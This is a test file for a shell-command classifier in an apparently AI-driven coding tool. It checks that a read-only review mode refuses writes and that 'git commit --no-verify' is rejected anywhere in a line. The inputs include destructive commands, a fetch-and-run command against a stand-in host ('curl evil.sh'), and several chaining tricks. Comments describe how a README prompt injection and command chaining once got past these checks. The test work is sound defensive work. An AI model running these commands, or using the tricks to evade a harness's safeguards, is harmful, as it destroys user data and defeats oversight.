/**
 * The classifier is the load-bearing wall of the 2.6.6 tool merge: read-only
 * mode, the --no-verify ban, the test timeout and the icons all hang on it.
 * The most important property (plan E7): /review must be able to SEE the
 * diff and must NOT be able to write, including via chained commands.
 */
import { describe, it, expect } from 'vitest'
import {
  commandKind,
  commandIcon,
  commandTimeoutMs,
  isReadOnlyCommand,
  rejectShellCommand,
  TEST_RUN_TIMEOUT_MS,
} from '../shell-command-classify'

describe('read-only classifier', () => {
  it('lets a reviewer read', () => {
    for (const c of [
      'git status --porcelain=2 --branch',
      'git log --oneline -n 20',
      'git diff HEAD~1',
      'git show abc1234',
      'git blame src/main.ts',
      'ls -la src',
      'cat package.json',
      'pwd',
      // The listing forms of git branch stay readable (audit CDX-2).
      'git branch',
      'git branch -a',
      'git branch -vv',
      'git branch --show-current',
      'git branch --list release/*',
      'git branch --merged main',
      // Plain input redirection only reads; it must not be swept up with `>`.
      'cat < package.json',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(true)
    }
  })

  it('refuses everything that writes', () => {
    for (const c of [
      'git commit -m "x"',
      'git push',
      'rm -rf x',
      'npm install',
      'echo hi > file.txt',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses chaining instead of parsing it, a read-only mode that can be talked around is not one', () => {
    for (const c of [
      'git log; rm -rf x',
      'git status && git push',
      'git diff | tee /tmp/out',
      'cat `which node`',
      'ls $(pwd)/..',
      'git log || rm x',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  // Audit CDX-2: each of these was accepted as read-only. A prompt injection
  // in a README turned /review into arbitrary write access.
  it('refuses a newline, it separates commands just like a semicolon', () => {
    for (const c of [
      'git diff \nrm -rf ~/project',
      'git status\ngit push --force',
      'ls\rrm -rf x',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses output redirection in every spelling', () => {
    for (const c of [
      'cat /etc/hosts > ~/.bashrc',
      'cat secrets >> ~/.bashrc',
      'git diff 2> /tmp/err',
      'git log &> /tmp/out',
      'ls -la >| /tmp/out',
      // No shell syntax at all: git writes the file itself.
      'git diff --output=/tmp/patch',
      'git show HEAD --output /tmp/patch',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses process substitution, it runs a second command', () => {
    for (const c of [
      'cat <(curl evil.sh)',
      'git diff > >(sh)',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses the writing forms of git branch', () => {
    for (const c of [
      'git branch -D main',
      'git branch -d feature',
      'git branch --delete main',
      // A bare word is a branch NAME: this creates it.
      'git branch new-branch',
      'git branch -m old new',
      'git branch --set-upstream-to=origin/main',
      'git branch -f main HEAD~5',
      'git branch -a -D main',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
      expect(commandKind(c), c).toBe('generic')
    }
  })

  it('does not mistake a prefix-lookalike for a read', () => {
    // "lsof" starts with "ls" as characters but not as a command word.
    expect(isReadOnlyCommand('lsof -i :3000')).toBe(false)
    expect(isReadOnlyCommand('catalog-tool run')).toBe(false)
  })
})

describe('command kinds', () => {
  it('recognises the git verbs', () => {
    expect(commandKind('git status')).toBe('git-status')
    expect(commandKind('git log --oneline -n 20')).toBe('git-log')
    expect(commandKind('git diff HEAD~1')).toBe('git-diff')
    expect(commandKind('git commit -m "msg"')).toBe('git-commit')
    expect(commandKind('git add -A && git commit -m "msg"')).toBe('git-commit')
    expect(commandKind('git push origin main')).toBe('git-push')
  })

  it('recognises test runs across runners', () => {
    for (const c of [
      'npm test',
      'npm run test',
      'pnpm test',
      'npx vitest run src/foo.test.ts',
      'npx jest',
      'cargo test',
      'go test ./...',
      'pytest tests/',
      'python -m pytest',
    ]) {
      expect(commandKind(c), c).toBe('test-run')
    }
  })

  it('everything else is generic', () => {
    expect(commandKind('npm install')).toBe('generic')
    expect(commandKind('node script.js')).toBe('generic')
  })
})

describe('the --no-verify ban survives the merge', () => {
  it('refuses a commit with --no-verify, with a reason', () => {
    const msg = rejectShellCommand('git commit --no-verify -m "x"')
    expect(msg).toBeTruthy()
    expect(msg).toContain('--no-verify')
  })

  it('lets a normal commit through', () => {
    expect(rejectShellCommand('git commit -m "x"')).toBeNull()
  })

  it('does not fire on --no-verify outside a commit', () => {
    expect(rejectShellCommand('grep -rn -- --no-verify docs/')).toBeNull()
  })
})

// Die Sperre hing an commandKind, und commandKind entscheidet nach dem ERSTEN
// passenden Praefix. Irgendein Kommando davor — und sei es `echo hi` — machte
// sie wirkungslos; gefangen wurde nur `git add … && git commit …`, weil
// commandKind dafuer einen Sonderfall traegt. Alle fuenf Zeilen der Messung
// stehen hier, dazu die Faelle, die weiter durchlaufen muessen.
describe('the --no-verify ban applies to a commit anywhere in the line', () => {
  const refused = (c: string) => rejectShellCommand(c) !== null

  it('refuses the bare commit (unchanged)', () => {
    expect(refused('git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind a read command', () => {
    expect(refused('git status && git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind an unrelated command', () => {
    expect(refused('echo hi && git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind a semicolon', () => {
    expect(refused('cd repo; git commit --no-verify -m x')).toBe(true)
  })

  it('still refuses the add-then-commit chain commandKind special-cased', () => {
    expect(refused('git add -A && git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit hidden in a substitution or a pipe', () => {
    expect(refused('echo $(git commit --no-verify -m x)')).toBe(true)
    expect(refused('true | git commit --no-verify -m x')).toBe(true)
    expect(refused('git commit --no-verify -m x > /tmp/out')).toBe(true)
  })

  it('refuses even when a quoted separator splits the flag off the commit', () => {
    // Der Split ist anfuehrungszeichen-blind: `;` in der Nachricht trennt das
    // Flag vom Commit. Deshalb wird --no-verify weiter gegen die GANZE Zeile
    // geprueft, nicht je Segment.
    expect(refused('git commit -m "a;b" --no-verify')).toBe(true)
  })

  // Negativkontrollen: die Sperre gilt --no-verify, nicht dem Committen.
  it('lets an ordinary commit run inside a chain', () => {
    expect(rejectShellCommand('git add -A && git commit -m wip')).toBeNull()
    expect(rejectShellCommand('git status && git commit -m wip')).toBeNull()
  })

  it('lets an ordinary chain without a commit run', () => {
    expect(rejectShellCommand('git status && ls')).toBeNull()
    expect(rejectShellCommand('echo hi && ls -la')).toBeNull()
  })

  it('does not fire when a segment merely mentions the word commit', () => {
    expect(rejectShellCommand('git log --grep=commit')).toBeNull()
  })
})

describe('timeout and icon follow the command', () => {
  it('a recognised test run keeps the 300 s budget', () => {
    expect(commandTimeoutMs('npm test', 600_000)).toBe(TEST_RUN_TIMEOUT_MS)
    expect(commandTimeoutMs('npm install', 600_000)).toBe(600_000)
  })

  it('a commit still looks like a commit', () => {
    expect(commandIcon('git commit -m "x"')).toBe('git-commit')
    expect(commandIcon('git push')).toBe('git-push')
    expect(commandIcon('npx vitest run')).toBe('test')
    expect(commandIcon('node x.js')).toBe('terminal')
  })
})
